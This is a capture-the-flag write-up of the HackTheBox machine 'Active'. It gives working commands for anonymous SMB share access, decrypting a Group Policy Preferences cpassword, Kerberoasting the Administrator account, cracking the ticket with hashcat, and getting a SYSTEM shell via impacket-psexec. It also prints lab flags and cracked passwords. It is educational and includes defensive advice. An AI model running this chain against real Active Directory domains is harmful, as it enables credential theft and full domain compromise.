# Active — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.2.51 |
| Domain | active.htb |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/active](https://jostif.pages.dev/writeups/active) |

**Techniques:** Anonymous SMB → Replication share → Groups.xml GPP cpassword → gpp-decrypt → Kerberoasting Administrator TGS → hashcat → impacket-psexec SYSTEM

---

---

## Overview

Active is an Easy-rated Windows Active Directory machine on Hack The Box and one of the most educational boxes for learning foundational AD attack techniques. Despite being rated Easy, it covers two very real and historically impactful vulnerabilities that have been found in countless real-world penetration tests:

1. **Group Policy Preferences (GPP) password exposure** — a legacy Windows feature that stored encrypted passwords in SYSVOL, readable by any domain user (or even anonymously in some cases). Microsoft patched this in 2014, but the misconfiguration still appears in the wild today.
2. **Kerberoasting** — abusing the Kerberos ticket system to request service tickets for accounts with SPNs, then cracking them offline.

The attack chain is beautifully simple:

```
Anonymous SMB read → SYSVOL GPP XML → decrypt cpassword
→ valid domain creds → Kerberoast Administrator TGS
→ crack hash → psexec as SYSTEM
```

No exploits. No CVEs. Just misconfigurations and abuse of legitimate Windows features.

---

## Enumeration

### Nmap

Starting as always with a full port scan:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.2.51
```

The results paint a clear picture — this is a Domain Controller:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Windows DNS |
| 88 | Kerberos | AD environment confirmed |
| 135/139 | RPC/NetBIOS | Standard Windows |
| 389/636 | LDAP/LDAPS | Domain: `active.htb` |
| 445 | SMB | Windows Server 2008 R2 SP1 |
| 464 | kpasswd | Kerberos password change |
| 593 | RPC over HTTP | Standard DC port |

One thing to note — **no port 5985 (WinRM)**. This means evil-winrm won't work here. We'll need to use psexec or wmiexec once we get credentials.

The OS is **Windows Server 2008 R2 SP1** — an older system, which is a hint that legacy misconfigurations might be in play.

Add the domain to `/etc/hosts`:

```bash
echo "10.129.2.51  active.htb dc.active.htb" | sudo tee -a /etc/hosts
```

Set up environment variables to save typing:

```bash
export IP=10.129.2.51
export DOMAIN=active.htb
```

### SMB Enumeration

Let's see what we can access without credentials:

```bash
nxc smb $IP -u '' -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$                            Remote IPC
NETLOGON                        Logon server share
Replication     READ
SYSVOL                          Logon server share
Users
```

Null authentication works and we can read the **Replication** share. This is unusual — `Replication` is not a default Windows share. In many older domain environments it's a copy of SYSVOL, which contains Group Policy data for all machines in the domain.

The `Users` share is listed but we don't have read access yet.

---

## Initial Foothold

### Exploring the Replication Share

Connect and grab everything recursively — when you see an unfamiliar share, always download everything and inspect offline:

```bash
smbclient //$IP/Replication -N
```

```
smb: \> cd active.htb
smb: \active.htb\> recurse on
smb: \active.htb\> prompt off
smb: \active.htb\> mget *
```

This downloads the entire directory tree. Among the files is one that immediately catches the eye:

```
Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

`Groups.xml` is a Group Policy Preferences file. These were used by administrators to push local group memberships, create local accounts, and set passwords across machines via Group Policy — all stored in SYSVOL/Replication as XML files.

### The Groups.xml File — GPP Password Exposure

```bash
cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="...">
  <User clsid="..." name="active.htb\SVC_TGS" ...>
    <Properties action="U" 
      userName="active.htb\SVC_TGS"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      .../>
  </User>
</Groups>
```

There it is. The `cpassword` field is an **AES-256 encrypted password**. You might think "encrypted = safe", but Microsoft made a critical mistake: they **published the AES key in their own documentation** (MS-GPPREF). This means anyone with the key can decrypt any `cpassword` value.

This vulnerability is tracked as **MS14-025** and was patched in 2014, but files already in SYSVOL were never cleaned up, and some environments still have them today.

### Decrypting the cpassword

The easiest way to decrypt it is with `gpp-decrypt`:

```bash
# Option 1 — impacket built-in
impacket-smbclient  # (gpp-decrypt is also bundled in some distros)

# Option 2 — standalone tool
git clone https://github.com/t0thkr1s/gpp-decrypt ~/tools/gpp-decrypt
python3 ~/tools/gpp-decrypt/gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```
[ * ] Password: GPPstillStandingStrong2k18
```

The password is even named after this exact vulnerability — `GPPstillStandingStrong2k18`. The box creator has a sense of humor.

We now have: `SVC_TGS:GPPstillStandingStrong2k18`

### Validating the Credentials

```bash
nxc smb $IP -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

```
[+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Valid. Let's see what this account unlocks:

```bash
nxc smb $IP -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
NETLOGON        READ
Replication     READ
SYSVOL          READ
Users           READ
```

We can now read the **Users** share. Let's grab the user flag:

```bash
smbclient //$IP/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
```

```
smb: \> cd SVC_TGS\Desktop
smb: \SVC_TGS\Desktop\> get user.txt
```

**User flag:** `bcc2c4eff37b431e6460978576a09463`

---

## Privilege Escalation — Kerberoasting

### What is Kerberoasting?

Before diving in, here's the concept:

When a user authenticates to a service in Active Directory (like a web server, SQL server, or file share), Kerberos issues a **Ticket Granting Service (TGS)** ticket. This ticket is encrypted using the service account's NT hash. If you can request one of these tickets, you can take it offline and try to crack it — without ever interacting with the service account directly.

For this to work, the target account needs a **Service Principal Name (SPN)** registered. SPNs are identifiers that link services to accounts.

The name `SVC_TGS` itself is a hint — it stands for Service Account Ticket Granting Service.

### Enumerating SPNs with GetUserSPNs

```bash
impacket-GetUserSPNs $DOMAIN/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $IP -request
```

Output:

```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,...
```

The **Administrator** account has an SPN registered (`active/CIFS:445`) and impacket automatically requests the TGS ticket and dumps the hash:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$9df8f0b1...d44e8d
```

This is a **Kerberos 5 TGS-REP hash** (etype 23 = RC4). We can crack it offline.

### Cracking the TGS Hash

Save the hash to a file and run hashcat with mode `13100`:

```bash
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$...' > admin_hash

hashcat -m 13100 admin_hash /usr/share/wordlists/rockyou.txt
```

Cracked in **4 seconds**:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968
```

Administrator password: `Ticketmaster1968`

Why did this crack so fast? The Administrator reused a weak password — `Ticketmaster1968` is in rockyou.txt. This is exactly why service accounts (especially privileged ones) should have long, random passwords that aren't dictionary words.

---

## Getting SYSTEM

### No WinRM — Use psexec

Port 5985 isn't open, so evil-winrm won't work. Instead we use `impacket-psexec`, which authenticates over SMB and uploads a service binary to get a SYSTEM shell:

```bash
impacket-psexec administrator:Ticketmaster1968@$IP
```

```
[*] Found writable share ADMIN$
[*] Uploading file MCFRbGkM.exe
[*] Creating service srDK on 10.129.2.51
[*] Starting service srDK
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32>
```

We land as `NT AUTHORITY\SYSTEM` — the highest privilege level on Windows.

The encoding errors in the terminal output are cosmetic — Server 2008 uses a different code page. The commands still work fine.

### Grabbing the Flags

```
C:\> cd Users\SVC_TGS\Desktop
C:\Users\SVC_TGS\Desktop> type user.txt
bcc2c4eff37b431e6460978576a09463

C:\> cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
f07d33f96702a93531a0ae4127d92b8d
```

---

## Flags

| Flag | Hash |
|------|------|
| User | `bcc2c4eff37b431e6460978576a09463` |
| Root | `f07d33f96702a93531a0ae4127d92b8d` |

---

## Full Attack Chain Summary

```
[1] Nmap → DC identified, domain: active.htb, OS: Server 2008 R2, no WinRM
        ↓
[2] SMB null auth → Replication share readable anonymously
        ↓
[3] Replication share mirrors SYSVOL → contains Group Policy data
        ↓
[4] Groups.xml found → cpassword field for SVC_TGS account
        ↓
[5] gpp-decrypt → cpassword decrypted → SVC_TGS:GPPstillStandingStrong2k18
        ↓
[6] SVC_TGS has domain access → Users share now readable → user.txt
        ↓
[7] GetUserSPNs → Administrator has SPN (active/CIFS:445)
        ↓
[8] TGS ticket requested → Kerberos RC4 hash extracted
        ↓
[9] hashcat -m 13100 → Administrator:Ticketmaster1968 (4 seconds)
        ↓
[10] impacket-psexec → SYSTEM shell → root.txt
```

---

## Key Concepts

### Group Policy Preferences (GPP) — MS14-025

Prior to the MS14-025 patch (2014), administrators could embed passwords in Group Policy files to configure local accounts and service settings across the domain. These files were stored in SYSVOL — a share that's replicated to all DCs and readable by all authenticated users (and sometimes anonymously, as in this box).

The encryption used a fixed AES key that Microsoft published in their own documentation. Any tool knowing that key can decrypt any `cpassword` value. The lesson: never store credentials in Group Policy files. Even if the domain is patched, old `Groups.xml` files sitting in SYSVOL from before the patch are still exploitable.

### Kerberoasting

Kerberoasting exploits a design feature of Kerberos — not a bug. Any authenticated user can request a service ticket (TGS) for any SPN in the domain. The ticket is encrypted with the service account's password hash. By requesting the ticket and cracking it offline, you never trigger account lockouts and leave minimal logs.

The takeaway for defenders: service accounts should have long, random passwords (30+ characters) that make cracking computationally infeasible. Microsoft's Managed Service Accounts (MSAs) and Group Managed Service Accounts (gMSAs) solve this by rotating passwords automatically.

### Why psexec Works Here

`impacket-psexec` works by uploading a small executable to the `ADMIN$` share and creating a Windows service that runs it. This requires:
- Admin credentials (which we have)
- Write access to `ADMIN$` (granted to admins)
- SMB access (port 445, open)

It gives a SYSTEM shell because Windows services run as SYSTEM by default.

### Checking for WinRM Before Trying evil-winrm

WinRM runs on port 5985. Always check nmap output first — if 5985 isn't open, evil-winrm will time out or error. On older systems like Server 2008, WinRM is often not enabled. Use psexec, wmiexec, or smbexec as alternatives.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `netexec (nxc)` | SMB authentication and share enumeration |
| `smbclient` | SMB share browsing and file download |
| `gpp-decrypt` | Decrypting GPP cpassword values |
| `impacket-GetUserSPNs` | Enumerating SPNs and requesting TGS tickets |
| `hashcat` | TGS hash cracking (-m 13100) |
| `impacket-psexec` | SYSTEM shell via SMB service upload |
